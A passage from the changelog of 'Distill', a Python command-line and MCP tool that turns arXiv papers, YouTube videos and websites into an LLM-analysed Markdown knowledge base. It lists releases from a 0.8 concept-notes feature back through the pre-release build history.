- **Credal-interval evidence bounds.** Frontmatter stores `helpful_evidence: [lower, upper]` and `harmful_evidence: [lower, upper]` where the lower bound counts unambiguous evidence and the upper bound additionally counts neutral mentions. The width is the disagreement / ambiguity margin. Scalar `helpful_count` / `harmful_count` derived views ship alongside in `concepts.jsonl` for ergonomic reads.
- **Deterministic delta merges.** The merge layer is pure Python: commutative under source ordering, idempotent under repeated application, monotonic-widening when new sources arrive. Property tests at 200 examples each pin the invariants.
- **`.history/` versioning.** Before overwriting an existing concept note, the prior content is snapshot to `library/topics/<topic>/.history/<slug>/<iso-timestamp>.md`. Idempotent: re-running the pipeline on an unchanged corpus writes nothing.
- **Contradiction surfacing.** Contested concepts (both polarities present) lift into `distill health <topic>` output, grouped by topic with helpful/harmful counts and source totals.

### CLI

- **`distill concepts <topic>`** - standalone command, idempotent. Flags: `--refresh` (re-extract over every insight), `--threshold N` (minimum distinct sources to emit, default 3), `--json` (envelope output).
- **`--concepts` opt-in flag** on `distill papers`, `distill latest`, `distill site-batch` so a single ingest produces concept notes in the same run. Best-effort: extraction failures don't fail the ingest.
- **`distill health <topic>`** extended with a "Contested concepts" section listing each contested concept with its helpful / harmful evidence counts and source totals, grouped by topic.

### MCP surface

- `find_concepts(topic, query, kind, contested_only, limit)` - ranked concept-row search across per-topic concepts.jsonl + entities.jsonl. Filters by name substring, kind, contested flag. Returns JIT shape (path + scalar fields + count).
- `read_concept(path)` - library-relative concept playbook reader with path containment and concepts/entities subdirectory enforcement.
- `list_contested(topic, limit)` - convenience wrapper for contested-only retrieval.

### Architecture and routing

- New `concepts` workload tag in the LLM router. Routes to `fast_model` by default; per-workload override via `DISTILL_CONCEPTS_MODEL` / `DISTILL_CONCEPTS_PROVIDER` like every other workload.
- Concept extraction cost surfaces in `cost_log.jsonl` with `call_type="concepts_extract"`, separable from analysis spend in `distill costs`.

### Tests + coverage

- 152 new tests across the 0.8 surface: unit (records, normalize, merge, notes, exports, extract, contradictions), property-based (commutativity, idempotency, monotonic widening, lower<=upper invariant), CLI (CliRunner), MCP (3 tools), and end-to-end integration against a 5-paper fixture corpus.
- Coverage on `distill/concepts/` is 98% (well above the 90% bar for new subpackages).
- Total project coverage 82.75%, up from 82.07%.

### Out of scope (deferred)

The roadmap's original 0.8 entry bundled five items; this release ships only the playbook core. The other two land in follow-up patches per the revised roadmap:

- `confidence:` -> `synthesis_scope:` frontmatter rename + migration -> 0.8.1.
- `distill ingest <path>` for local PDFs / markdown / clipped articles -> 0.9 alongside discovery-loop and synthesis-depth work.

This keeps the playbook PR focused and the synthesis-rename / local-ingest changes properly scoped on their own.

## 0.7.2 - 2026-05-14

Patch release: synthesis-quality rewrite plus SSRF hardening on the PDF-attachment path.

### Synthesis quality

- Rewrite `paper_topic_synthesis_prompt` to demand cross-paper claims, a comparison matrix, concrete disagreements, and shared methodological blind spots. The previous prompt was producing topic-clustered capsule summaries that duplicated the per-paper Insights files; the new prompt explicitly calls out that anti-pattern and requires multi-paper attribution on every claim.
- Skip `synthesize_corpus` when the only source section is paper synthesis. Running corpus synthesis over a single section was a summary-of-a-summary with zero new signal; the paper synthesis already is the corpus synthesis for papers-only topics.

### Security

- PDF attachment ingestion now disables auto-redirects and re-validates every redirect target (max 5 hops) through `is_public_web_url`. Closes the redirect-bypass gap in the SSRF/size-cap hardening shipped in 0.7.1's security pass - a redirect to `127.0.0.1` or RFC1918 is now rejected before the fetch.

### Tests + coverage

- Added unit coverage across costs, router, MCP tools, attachment redirect handling, scraper, learning flow, preflight, and report pipelines. Total coverage is now 82%+ on `distill/`.

## 0.7.1 - 2026-05-08

Patch release with hardening fixes found during QA.

- Fix: Windows reserved device names (NUL, CON, PRN, etc.) in slugs now prefixed with underscore to avoid filesystem errors.
- Fix: Wiki-link display titles now strip pipe, bracket, and newline characters that would break Obsidian syntax or markdown rendering.
- Fix: `scan_legacy_artifacts` skips hidden directories (.git, .hypothesis, etc.).
- Fix: `distill doctor --links --json` uses the standard JsonEnvelope wrapper for consistency with other commands.
- Fix: Global `--json` flag is respected in `doctor --links` mode.
- Fix: Path comparison in migration uses `Path.is_relative_to()` instead of string prefix matching.
- Fix: `emit_wiki_link` validates that `corpus_dir` is a directory before globbing.
- Fix: Artifact type fallback in WikiLink handles hyphens correctly (e.g., `custom-type` becomes `Custom_Type`).

## 0.7.0 - 2026-05-07

Living Wiki. The corpus shifts from a directory of artifacts to a navigable knowledge base interoperable with Obsidian, Logseq, and Dendron. Also ships critical code-health prerequisites that prevent compounding debt in later milestones.

### Wiki-link discipline and Obsidian interop

- **Wiki-style cross-linking.** Synthesis, brief, report, and research-brief outputs now emit `[[slug_Insights|Title]]` references instead of plain-text citations. Obsidian's backlink panel and graph view work out of the box.
- **Stable slug discipline.** `slugify_title` is deterministic, filesystem-safe on all platforms (including Windows reserved names like NUL/CON), and handles collision disambiguation via `.source_meta.json`.
- **`distill doctor --links`.** Scans the corpus for broken wiki-links. Supports `--json` for structured output and `--fix` to replace broken links with plain-text citations.
- **`distill open --vault`.** Opens the library directory in your default editor or Obsidian. Respects `DISTILL_VAULT_EDITOR` env var. Supports `--path` for subdirectories.
- **Backfill / migration tooling.** `distill doctor --migrate-links` scans for legacy-named artifacts (`insights.md`, `synthesis.md`, etc.) and proposes renames to the modern `<slug>_Insights.md` convention. Dry-run by default; `--apply` executes.

### Artifact provenance in frontmatter

- Every generated artifact now records `model`, `model_version`, `temperature`, and `prompt_id` in YAML frontmatter. This is the foundation for reproducibility - outputs can be compared across model versions and prompt iterations.
- All pipeline stages (video analysis, paper analysis, site analysis, synthesis, brief, report, research-brief) write provenance fields.

### CLI decomposition

- `_cli_impl.py` reduced from ~6,800 lines to 22 lines (re-export shim). All business logic moved to `distill/commands/_logic.py`.
- `cli_support/` absorbed into `commands/` package (`_learning.py`, `_learning_flow.py`, `_topic_changes.py`).
- CLI interface unchanged: all command names, flags, arguments, and help text preserved.

### Path and slug centralization

- `slugify_title`, `sanitize_path_component`, and `site_name_from_url` moved from `config.py` to `distill/library/paths.py` (architecturally correct foundational layer).
- Old imports from `distill.config` emit `DeprecationWarning` and delegate.

### Legacy router bridge removal

- Deleted `router_config_from_distill` and `apply_model_override` from `config.py`.
- `RouterConfig` is now a Pydantic `BaseSettings` subclass reading env vars directly (API keys from canonical names, routing from `DISTILL_` prefix).
- `config.py` has zero imports from `distill.llm`.

### Report-phase retry hardening

- The 3-failure circuit breaker in the report accordion now uses exponential backoff with jitter (base 2s, up to 50% jitter).
- `LLMCall` dataclass (`distill/llm/call.py`) captures full request/response metadata for debugging.
- `distill/llm/retry.py` provides reusable `retry_with_backoff` and `compute_delay` functions.
- Failed and retry-success attempts are logged with structured `LLMCall` records.

### Quality

- 12 correctness properties validated via Hypothesis property-based testing (slug determinism, filesystem safety, collision disambiguation, wiki-link format, frontmatter round-trip, provenance completeness, retry delay bounds, RouterConfig env mapping, link integrity, migration correctness).
- 1,275 tests passing. New modules at 84-100% coverage.
- Import-linter: 3 contracts kept, 0 broken.
- Ruff zero-warning. Pyright zero-error on `distill/llm/`.

## 0.6.0 - 2026-05-06

Local inference with adaptive context. When ingestion is basically free (local models), you use it more - more sources, more frequent refreshes, richer corpus. Quality bar is the same as cloud.

### Added

- **Ollama provider.** Full implementation using httpx for the Ollama HTTP API. Retry with exponential backoff, connection error handling with descriptive messages, context window detection via `/api/show`, model listing via `/api/tags`.
- **LM Studio provider.** OpenAI-compatible client pointed at `localhost:1234/v1`. Supports `LMSTUDIO_BASE_URL` env var override.
- **Provider metadata.** `ProviderMetadata` dataclass with context window, provider type (local/cloud), and provider name. Automatic resolution for both local (queried from API) and cloud (lookup table) providers.
- **Adaptive chunking.** Section-aware content splitting when content exceeds the provider's context window. Preserves heading context in each chunk. Passthrough when content fits. Automatic based on provider metadata - users don't configure this.
- **Per-category reranking.** Keyword-based scoring of chunks by relevance to each insight category (Key Findings, Methods, Limits, Open Questions). Top-k selection within context window. Skips categories where all chunks score below threshold.
- **Multi-pass analysis.** Focused per-category passes over chunked content, merged into a unified insight matching the same structure as single-pass cloud analysis. Deduplication of overlapping insights.
- **Report compaction.** High-recall summaries (25% of original) between report pipeline phases, preserving all named entities and quantitative claims. Precision second pass (10%) when first pass still exceeds window. Applied universally (cloud and local).
- **Hardware detection.** `distill doctor` detects NVIDIA GPUs (via nvidia-smi), Apple Silicon (via sysctl), system RAM, and container environments.
- **Model recommendations.** Hardware-tier-based model suggestions (4090 → qwen3.5:27b, M1 16GB → qwen3.5:14b). Configurable via JSON file. Includes pull commands for missing models.
- **Quality gate (stub).** `EvalResult` dataclass and `run_eval_suite()` interface ready for Phase 9 baselines.
- **Cost display - local/cloud split.** `distill costs` shows cloud spend (USD) and local inference time (seconds, tokens/second) separately.
- **`--model` CLI override.** Global `-m`/`--model` flag forces all workloads to a specific model for the invocation.
- **Docker support.** `Dockerfile` with Playwright deps and `docker-compose.yml` with Ollama GPU passthrough, library volume mount, and MCP server port exposure.
- **Telemetry extension.** `provider_type`, `provider_name`, and `tokens_per_second` fields in telemetry records. Backward compatible with existing JSONL.

### Changed

- Router imports `LOCAL_PROVIDERS` from metadata module for provider type classification.
- `_emit_telemetry()` accepts and passes provider metadata fields.
- Paper analysis pipeline checks provider metadata and invokes chunker when content exceeds context window.

### Quality

- 1069 tests passing (unit + integration).
- 13 property-based tests for local inference: response parsing, model passthrough, retry count, provider classification, chunk size invariant, content preservation, chunking decision, heading context, compaction length, entity preservation, telemetry round-trip, token estimation, router resolution.
- `ruff check`, `ruff format`, and `lint-imports` all pass cleanly.

## 0.5.0 - 2026-05-06

MCP-first surface + Grok 4.3 migration. The MCP server becomes the primary product surface, and all model references are updated ahead of the May 15 xAI retirement deadline.

### Added

- **JIT context retrieval.** New `find_insights(topic, query)` MCP tool returns ranked `(path, preview, score)` tuples - agents get paths and one-line previews instead of full file payloads (~96% token savings). `read_insight(path, section?)` drills down into specific artifacts or sections.
- **Structured CLI output.** Global `--json` flag on every command produces machine-readable `JsonEnvelope` output to stdout. Diagnostics go to stderr. `NO_COLOR` is respected.
- **Stable exit codes.** Documented exit codes (0-5) for success, runtime error, usage error, config error, network error, and not-found. Available in `docs/usage.md`.
- **New MCP tools.** `papers`, `discover`, `site_batch`, `synthesize`, `costs`, `doctor` mirror their CLI counterparts with progress events and structured results.
- **Progress events.** Long-running MCP tools emit progress notifications (per-paper, per-page, per-stage) so clients can display status and detect stalls.
- **Token-efficient tool descriptions.** All tool descriptions ≤100 chars, all parameter descriptions ≤50 chars. Reduces context window consumption when agents load multiple MCP servers.
- **`distill alerts` command.** CLI command to display watch-alert digest (Rich or JSON). MCP resource `distill://watch-alerts` returns clear message when no alerts exist.
- **Grok 4.3 as default model.** All workloads now default to `grok-4.3` (1M context window, $1.25/$2.50 per 1M tokens).
- **Reasoning effort configuration.** Per-workload `DISTILL_{WORKLOAD}_REASONING_EFFORT` env vars (low/medium/high). Premium workloads default to "high", fast-tier to "medium".
- **Retired model fallback.** If a retired model is configured, the router logs a deprecation warning and automatically substitutes the recommended replacement.
- **`distill doctor` retired-model check.** Warns when configured models are on the retirement list with specific replacement guidance.
- **Migration guide.** `docs/migration-grok-4.3.md` documents all 8 retired models, their replacements, and reasoning effort configuration.

### Changed

- Default `accordion_section_model` changed from `grok-4-1-fast-reasoning` to `grok-4.3`.
- Default `xai_site_model` changed from `grok-4.20-0309-reasoning` to `grok-4.3`.
- Cost table expanded with pricing for `grok-4.20-non-reasoning`, `grok-imagine-image`, and all 8 retired models (retained for historical cost computation).
- `RETIRED_MODELS` mapping and `RETIREMENT_DATE` constant added to `distill/llm/router.py`.

### Quality

- 960 tests passing (unit + integration).
- Property-based tests (Hypothesis) for: search ordering, limit bounds, preview format, section extraction, JSON round-trip, tool descriptions, schema validity, retired model fallback, reasoning effort override, cost table completeness, doctor output.
- `ruff check`, `ruff format`, and `lint-imports` all pass cleanly.

### Added

- **JIT context retrieval.** New `find_insights` and `read_insight` MCP tools enable agents to search the corpus by topic/query and receive ranked path/preview/score tuples, then drill down to specific sections - saving ~96% of tokens vs. full file payloads.
- **Search engine** (`distill/pipeline/search.py`). Term-frequency scoring with heading boost (2×) and type boost (1.5× for synthesis/corpus). Preview generation ≤120 chars. Section extraction by heading name.
- **Structured CLI output.** Global `--json` flag on all commands produces a `JsonEnvelope` (status/data/error) on stdout with diagnostics on stderr. No ANSI codes in JSON mode.
- **Stable exit codes.** 0=success, 1=runtime, 2=usage, 3=config, 4=network, 5=not-found. Documented in `docs/usage.md`.
- **6 new MCP tools.** `papers` (arXiv search + ingest), `discover` (goal-aware cross-source), `site_batch` (URL list scraping), `synthesize` (topic synthesis), `costs` (LLM spend history), `doctor` (environment health check).
- **Progress events.** Long-running MCP tools (`papers`, `discover`, `site_batch`, `synthesize`) emit MCP SDK progress notifications per-item.
- **Token-efficient descriptions.** All tool descriptions ≤100 chars, all parameter descriptions ≤50 chars. Semantic accuracy preserved.
- **`distill alerts` command.** Displays the watch-alert digest in Rich (default) or JSON (`--json`).
- **Property-based tests.** 12 Hypothesis properties covering search ordering, preview format, JSON round-trip, description limits, schema validity, and progress events.

### Changed

- **Tool descriptions rewritten.** All 9 existing tools + 8 new tools now have compressed descriptions within the character limits.
- **MCP server imports.** New tool modules (`find`, `papers`, `sites`, `synthesis`, `costs`, `doctor`) registered in `server.py`.

### Backward Compatibility

- All 9 existing tool input schemas preserved (no type/required/default changes).
- All 12 resource URIs respond unchanged.
- All 4 prompts retain their argument signatures.
- CLI output without `--json` is identical to 0.4.0 behavior.

## 0.4.0 - 2026-07-14

Package restructure: flat `distill/` → layered subpackage architecture.

### Added

- **Layered subpackage architecture.** The flat `distill/` package is now organized into focused subpackages: `commands/` (one Typer command group per file), `ingestors/` (YouTube, sites, papers), `pipeline/` (analysis, synthesis, report orchestration), `library/` (filesystem corpus layer), `prompts/` (all prompt templates), and `mcp/` (MCP server split by concern).
- **Structured logging.** `configure_logging()` with `--debug` CLI flag. Console handler emits WARNING+ by default, DEBUG with `--debug`. File handler always writes DEBUG to `library/.distill/distill.log`.
- **SecretStr for API keys.** `xai_api_key`, `gemini_api_key`, and `openai_api_key` in `DistillConfig` now use Pydantic `SecretStr` - keys are masked as `'**********'` in logs, repr, and debug output.
- **import-linter dependency direction enforcement.** Three contracts in `pyproject.toml` enforce that foundational layers (`library/`, `prompts/`) never import from higher layers, ingestors don't import from commands/pipeline/mcp, and pipeline doesn't import from commands/mcp. Run `lint-imports` to verify.
- **Mirrored test layout.** Test directory structure under `tests/unit/` mirrors the source layout (`tests/unit/commands/`, `tests/unit/ingestors/youtube/`, `tests/unit/pipeline/analysis/`, etc.). Integration tests live in `tests/integration/`.

### Changed

- **`cli.py` reduced to ≤65 lines.** All business logic lives in `_cli_impl.py`; command groups are thin Typer wrappers in `distill/commands/`.
- **`mcp_server.py` split into `mcp/` subpackage.** Transport in `server.py`, tools in `tools/`, resources in `resources.py`, prompts in `prompts.py`.
- **`prompts.py` split into domain-specific files.** `prompts/analysis.py`, `prompts/synthesis.py`, `prompts/report.py`, `prompts/discover.py`, `prompts/shared.py`.
- **Backward-compatible shims removed.** Old flat-file import paths (`distill.artifacts`, `distill.discovery`, `distill.analysis`, etc.) are no longer available. Use the canonical subpackage paths.
- **`router_config_from_distill()` updated** to call `.get_secret_value()` on SecretStr fields.
- **Pre-push checklist** now includes `lint-imports` step.

## 0.3.1 - 2026-05-03

LLM router abstraction and model upgrade.

- **LLM router package** (`distill/llm/`). Centralized workload-to-provider dispatch replaces 26 scattered LLM call sites across 11 modules. Single entry point (`distill.llm.call()`) with per-prompt telemetry, unified cost registry, and provider caching.
- **Grok 4.3 default.** Both fast and premium tiers now default to `grok-4.3` ($1.25/$2.50 per 1M tokens) - better quality at roughly half the cost of the previous `grok-4.20-0309-reasoning`.
- **Multi-provider architecture.** Provider protocol (`typing.Protocol`, async-ready) supports xAI (Grok), Google (Gemini), and Agent/Skill mode. Anthropic, OpenAI, and Ollama stubs registered for future milestones. Per-workload provider overrides via `DISTILL_{WORKLOAD}_PROVIDER` env vars.
- **Agent/Skill provider.** Zero-cost deferred execution mode for users with agentic assistants. Writes structured task files with SHA-256 prompt hashing for idempotent lookup.
- **Per-prompt telemetry.** Every LLM call emits a `Telemetry_Record` to `library/.distill/telemetry.jsonl` with model, workload tag, token counts, elapsed time, run_id, and outcome.
- **Unified cost registry** (`distill/llm/cost.py`). Single source of truth for all model pricing. `distill/costs.py` delegates to it. Supports per-token and per-query pricing models.
- **Ops_Dir separation.** Operational data (telemetry, cost logs, task queues) moved to `library/.distill/` - a hidden dotdir that keeps the corpus clean for any markdown tool. Existing `cost_log.jsonl` auto-migrated on first run.
- **Quality conventions established.** `distill/llm/` ships with `# pyright: strict`, 400-line module cap, C901 complexity enforcement, 80%+ test coverage, and 11 Hypothesis property-based tests. Pyright blocking in CI for the new package.
- **Backward-compatible configuration.** All existing `.env` variables continue to work unchanged. New `DISTILL_PROVIDER` and per-workload provider overrides are additive.

## [0.3.0] - 2026-04-28

Knowledge-base artifact contract: generated Markdown now behaves like a durable PKM / AI-native corpus instead of a pile of repeated generic filenames.

### Added

- Globally descriptive artifact names for new Markdown and text outputs, such as `<video-slug>_Insights.md`, `<paper-slug>_Paper.md`, `<topic>_Topic_Synthesis.md`, `<topic>_Report.md`, and `<topic>_Topic_Diff.md`.
- Standard YAML frontmatter on generated Markdown artifacts, including fields such as `title`, `type`, `topic`, `source`, `source_id`, `url`, `date`, `authors`, `tags`, `confidence`, and artifact-specific metadata.
- Shared artifact helpers for modern filename generation, frontmatter writing, and legacy fallback reads.

### Changed

- Video, paper, website, synthesis, briefing, report, topic-watch, MCP, dashboard, and web routes now read through the shared artifact layer.
- Existing libraries with legacy names such as `insights.md`, `paper.md`, `content.md`, `synthesis.md`, and `topic_synthesis.md` remain readable, but new writes use the knowledge-base naming contract.
- README and output docs now frame Distill as a local corpus engine for Markdown tools, MCP clients, and AI assistants rather than an Obsidian-only integration.
- ROADMAP pulls the stable slug/frontmatter work forward into the 0.3 build and leaves wiki-links/concept notes for the later living-wiki milestones.

### Fixed

- Stale or missing local installs now work cleanly when reinstalled from the current checkout.
- CI formatting drift from the artifact naming work was normalized with `ruff format`.

## [0.2.0] - 2026-04-27

Discovery loop hardening: goal-aware cross-source front door, yt-dlp robustness, and a clean preview → approve → ingest workflow that surfaces costs and respects what the user actually asked for.

### Added

- **`distill discover "<goal>" --topic X`** - goal-aware cross-source front door. Takes a natural-language research goal, has Grok generate paper + video search queries, fans out to arXiv and YouTube, runs a unified *goal-aware* LLM rerank across both source types (scores on goal_fit / depth / complementarity), shows a single ranked table of mixed papers and videos, and - after interactive confirmation - ingests the shortlist through the existing paper and video pipelines. Flags: `--topic/-t`, `--paper-limit`, `--video-limit`, `--papers-only`, `--videos-only`, `--days`, `--shorts/--no-shorts`, `--preview`, `--yes/-y`, `--goal-file`.
- **`--goal-file` for `distill discover`** - mirrors the `--context-file` pattern from `research-brief` and `synthesize`. The goal argument can now be loaded from a markdown file, enabling reusable, goal-driven topic refreshes (e.g. save `private/ai-composer-goal.md` and re-run discover against it on a cadence without retyping).
- **`distill discover --papers-only` / `--videos-only`.** Mutually exclusive flags that explicitly skip one source type. Skipping a side short-circuits the LLM query-generation call for that side so you don't pay for queries the run will throw away. Useful when a topic has thin or unrigorous YouTube coverage (run papers-only) or is dominated by talks/lectures with little formal-paper presence (run videos-only).
- **`distill latest --top-by-date`.** Strict "last N uploads in the window" semantics - bypasses both the LLM rerank and the heuristic relevance/depth mix and sorts the final pick purely by upload date (most recent first). Channel cap still applies so one prolific uploader can't monopolize the slate. Implies `--no-rerank` so query-expansion spend doesn't get billed for output that's then ignored. Use when you literally want "what got uploaded recently" rather than "what's most relevant in the window."
- **`distill papers` query expansion, LLM rerank, and `--preview`** - brings `distill papers` to parity with `distill latest`. One user query now expands into up to six arXiv search variants (heuristic + Grok), results are deduped by `paper_id` across variants, and a Grok-based rerank (`RankedPaper` with relevance / depth / novelty / credibility scores) picks the top-N *before* per-paper PDF analysis. `--preview` short-circuits to the ranked table for inspection without ingestion. New flags: `--preview`, `--sort relevance|date` (new default: relevance), `--expand/--no-expand`, `--rerank/--no-rerank`. arXiv multi-query calls are spaced 3.5s apart to respect rate limits.
- **yt-dlp staleness preflight.** Commands that rely on yt-dlp (`channel`, `search`, `explore`, `learn`, `latest`, `discover`, `topic update`, `catch-up`, `topic-watch run`, `ramp-up`) run a cheap version-age check on entry. yt-dlp uses date-stamped releases (`2026.3.17`), so the check parses the version locally with no network call. If the install is more than 14 days old, a single non-blocking warning points at `distill doctor --update`. Result is cached for 24h in `library/.preflight.json`; honors `DISTILL_NO_PREFLIGHT=1` for CI/scripted runs.
- **`distill doctor --update`** upgrades yt-dlp via `pip install --upgrade yt-dlp` and invalidates the preflight cache so the next run re-validates. The doctor's Tools section now shows yt-dlp age (`(3d old)` green, or yellow with a hint when stale, or "(latest available release)" in dim when an update was just attempted and pypi has nothing newer).
- **Extractor-failure hint in discovery errors.** When yt-dlp raises an extractor-style error in `discover_videos` or `search_videos` (matched on patterns like `extractor`, `unable to extract`, `sign in to confirm`, `HTTP error 4xx`), Distill prints a one-line hint pointing at `distill doctor --update` so users can connect the symptom to the fix.
- **Preview-mode cost logging.** `distill discover --preview`, `latest --preview`, `papers --preview`, `search`, `explore`, `topic-watch run --preview`, and `monitor --preview` now write a separate `<command>_preview` row to `library/cost_log.jsonl`. Iterative preview cycles (probe, retune, re-probe to size a real run) used to disappear from cost telemetry; they're now visible in `distill costs` and can be summed independently of ingest spend.
- **`log_preview_cost` helper in `distill.summary`.** Lightweight call site for any future preview path: `log_preview_cost(tracker, log_dir, command, metadata=...)`. No-ops on empty trackers so preview paths can call it unconditionally without producing zero-row noise.

### Changed

- **`distill papers` default behavior.** Previously: literal query, newest-first by submission date, all top-N ingested blindly. Now: expanded, reranked, relevance-sorted, top-N picked by LLM. The old behavior is still available via `--no-expand --no-rerank --sort date`. This fixes the failure mode where generic queries (e.g. "music theory deep learning", "automatic harmonization") pulled in unrelated subfields (physics, image processing) because arXiv's tokenizer has no concept of research intent.
- **`distill doctor --update` post-upgrade reporting.** When pip reports `Requirement already satisfied` (i.e. you're already on the latest published yt-dlp release), doctor now says "yt-dlp v… is already the latest published release" instead of falsely claiming "upgraded to v…". In the same run, the Tools section suppresses the "X days old; run `distill doctor --update`" nag - pypi simply doesn't have a newer release yet - and shows "(latest available release)" instead.
- **Preflight banner uses an ASCII marker.** The `⚠` glyph in the yt-dlp staleness banner has been replaced with `!` so the warning still prints even on terminals that somehow bypass the UTF-8 stdio bootstrap.
- **API: `update_ytdlp()` returns `(ok, detail, was_noop)`** instead of `(ok, detail)`. Callers (only the `doctor` CLI command in-tree) updated. Lets the doctor distinguish a real upgrade from a no-op.

### Fixed

- **Windows cp1252 console crash.** A default Windows console encodes stdout as cp1252, which raised `UnicodeEncodeError` on the `⚠` glyph in the yt-dlp staleness preflight banner - every Distill command that touched yt-dlp would crash on first run if the install was older than 14 days. Fixed by reconfiguring `sys.stdout` and `sys.stderr` to UTF-8 with `errors="replace"` at process startup via a side-effect import of `distill._bootstrap`. Idempotent and silent under pytest capsys / pipes / redirected streams.
- **`distill topic show` corpus counts.** `_count_paper_corpus(config, topic)` and `_count_site_corpus(config, topic)` were called with a single string but expected `list[str]`, so the count iterated character-by-character and almost always returned 0 (and the site call interpolated a `(0, 0)` tuple into the Corpus line). Now passes `[topic]` and unpacks to a clean "N site(s) / M page(s)" line.
- **`distill doctor` yt-dlp version probe.** The previous code accessed `yt_dlp.version.__version__` (an indirect submodule attribute pyright already flagged). If yt-dlp ever restructures, doctor would falsely report "yt-dlp not found." Switched to `importlib.metadata.version("yt-dlp")`.
- **`yt_dlp.utils.DateRange` constructed inside the try/except in `discover_videos`.** The dict was previously built before the `try:` block, so any future yt-dlp restructuring of the `utils` namespace would crash discover before the safety net catches it. Now the construction is inside the `try:`.
- **CI green across the board.** Three test failures, the security scan, and lint were all failing on Linux runners while passing locally on Windows. Fixes: `getattr(os, "startfile", None)` so the `open` command can be exercised cross-platform; `console.legacy_windows` check no longer gated by `os.name == "nt"`; `console.print` + `typer.Exit(2)` instead of `typer.BadParameter` for `site --report` + `--scrape-only` validation (Typer 0.24's rich-formatted error broke the substring assertion in CI); `pip-audit --skip-editable --ignore-vuln CVE-2026-3219` (the editable self-install is not on PyPI under this name yet, and pip 26.0.1 has an unfixed CVE upstream); pyright `reportAttributeAccessIssue`/`reportArgumentType`/`reportAssignmentType`/`reportReturnType`/`reportIndexIssue`/`reportPossiblyUnboundVariable` demoted to warnings (dominated by third-party stub gaps in mcp/yt-dlp/python-docx and typer Optional artifacts).
- **arXiv query building no longer phrase-matches 3+ word queries.** `_build_search_query` used to wrap any multi-word query in quotes for strict phrase matching. That was too strict for LLM-generated queries like `"symbolic music transformer composition"`, which returned zero results as a literal phrase even when the target papers existed. New policy: 1 word → single-term; 2 words → phrase match (naturally phrasal); 3+ words → AND-joined tokens so every term must appear but not necessarily adjacent. Pre-operator input (quotes, AND/OR, parens) still passes through untouched.

## [0.1.0] - 2026-04-20

Initial public release as `distillr` on PyPI.

### Added

- **arXiv paper ingestion** (`distill papers <query>`) - phrase-matched search, latest-N selection by submission date, full-PDF text extraction (pypdf, 100K char cap, unicode-surrogate sanitized), per-paper structured insights, paper-level cross-paper synthesis.
- **Multi-topic research briefings** (`distill research-brief`) - Gemini Deep Research over one or more topic corpora with a user-supplied context file (`--context-file`). Web-augmented; writes `output/briefing-{name}.md`.
- **Multi-topic deep synthesis** (`distill synthesize`) - single Grok 4.20 call over the gathered corpus with user-supplied context. No web augmentation; writes `output/synthesis-{name}.md`.
- **Briefing context template** - `docs/briefing-contexts/TEMPLATE.md` showing the shape for audience, corpus expectation, required structure, and rules.
- **`private/` convention** - user-local files (client-specific seeds, personal context files, scratch notes) live under `private/`; directory contents are git-ignored except for `private/README.md`, which documents the pattern.
- **Model pinning** - xAI premium/site workload defaults pinned to `grok-4.20-0309-reasoning`; fast workload defaults to `grok-4-1-fast-reasoning`. Overrides via `.env` (see `.env.example`).

### Changed

- Package renamed from `distill` to `distillr` for PyPI distribution. Command (`distill`), Python imports (`import distill`), and repo identity remain `distill`.
- README opener rewritten to lead with the source-to-intelligence platform story rather than YouTube specifically; shields.io badge row and Table of Contents added so the long README is navigable.
- ROADMAP restructured: historical build phases moved here under "Pre-release Development"; ROADMAP section 10 added ("Living Wiki Corpus").

### Fixed

- arXiv search now phrase-matches multi-word queries (previously OR'd tokens, flooding results with unrelated papers).
- Paper ingestion now fetches and extracts the full PDF rather than analyzing the abstract only.
- PDF text extraction sanitizes lone surrogate codepoints that break JSON encoding for the API call.

### Infrastructure

- `LICENSE` added (MIT).
- `CONTRIBUTING.md` added with the full tool-stack and quality-gate documentation.
- `CHANGELOG.md` added.
- `SECURITY.md` added with vulnerability reporting flow.
- `.gitignore` rewritten with comprehensive coverage: Python build artifacts, virtual environments, test/coverage caches (`.coverage`, `htmlcov/`, `.ruff_cache/`, `.pytest_cache/`, `.mypy_cache/`), IDE/editor files, OS files, `.claude/`, `archive/`, logs, and distill runtime data (`library/`, `output/`, `tmp/`). `private/*` ignored except `private/README.md`.
- `.pre-commit-config.yaml` added (ruff, ruff-format, bandit, whitespace/yaml/toml/merge-conflict/private-key hooks).
- `.github/workflows/ci.yml` added with jobs for test (Python 3.10/3.11/3.12), lint (ruff check + format), security (bandit + pip-audit), types (pyright, advisory), and build (sdist + wheel artifact).
- GitHub templates: `.github/ISSUE_TEMPLATE/bug_report.md`, `.github/ISSUE_TEMPLATE/feature_request.md`, `.github/PULL_REQUEST_TEMPLATE.md`.
- `CODE_OF_CONDUCT.md` added (Contributor Covenant v2.1).
- Ruff rule set expanded: added `C4, PTH, RET, T20, A` with focused ignores; typer `Option`/`Argument` factories whitelisted from B008 globally via `extend-immutable-calls`.
- Security hardening: all `urllib.request.urlopen` calls route through a single `distill.net.safe_urlopen` helper that rejects non-`https` schemes; arXiv XML parsing switched from `xml.etree.ElementTree` to `defusedxml`; SHA-1 hash used for content dedup annotated `usedforsecurity=False`.
- Runtime deps: added `pypdf`, `requests`, `defusedxml` (previously relied on transitive deps; now explicit in `pyproject.toml`).
- Removed `requirements.txt`; `pyproject.toml` is the single source of truth for runtime and dev dependencies. CI's `pip-audit` scans the installed distribution directly.
- New `[project.optional-dependencies].dev` extra: `pytest`, `pytest-cov`, `ruff`, `bandit`, `pip-audit`, `pre-commit`, `build`, `twine`. Install with `pip install -e ".[dev]"`.

---

## Pre-release Development

The sections below consolidate the build history that predates the public 0.1.0
release. They are kept here for historical interest; individual commits and PRs
in the repository history tell the same story at finer resolution.

### Foundation

- Project scaffolding (`.env`, `config.py`, CLI skeleton)
- Library management (`library.json`, `add`/`remove`/`library` commands)
- Video discovery (yt-dlp channel listing, date filtering, metadata)
- State tracking (`state.json` per channel, skip already-processed)
- Transcript acquisition (YouTube auto-captions first, scribe fallback)

### Intelligence

- Prompt engineering (multi-category extraction, grounded synthesis, no vendor hallucination)
- Grok 4.1 integration (xAI API, retry logic with exponential backoff)
- Per-video analysis (2-pass pipeline: extraction -> synthesis -> `insights.md`)
- YouTube Shorts support (1-pass quick insight extraction, signal-strength rating)
- Channel context (auto-generated `channel_context.md`)

### Synthesis

- Per-channel synthesis (`synthesis.md` from all video insights including Shorts)
- Per-topic synthesis (`topic_synthesis.md` across channels)
- Refresh logic (`--refresh` flag, only new videos, regenerate synthesis)

### Reports

- Gemini Deep Research integration (File Search grounding, polling, auto-cleanup)
- 4-phase report generation (research -> section writing -> assembly -> QA)
- Scope-adaptive sections (single-channel vs multi-channel section lists)
- Voice-matched section types (reference, analytical, actionable) with temperature control
